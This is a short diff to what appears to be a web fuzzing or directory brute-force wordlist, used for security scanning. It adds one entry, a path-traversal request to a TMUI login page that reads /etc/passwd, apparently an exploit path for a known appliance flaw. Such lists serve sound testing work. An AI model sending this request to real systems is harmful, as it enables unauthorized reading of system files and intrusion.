@@ -1,4 +1,3 @@
-
 !
 !=
 &&
@@ -5191,6 +5190,7 @@ autotopup
 autotopup_old
 autoupdate
 autoupdate/
+tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
 autoviewer_pro
 autres
 aux
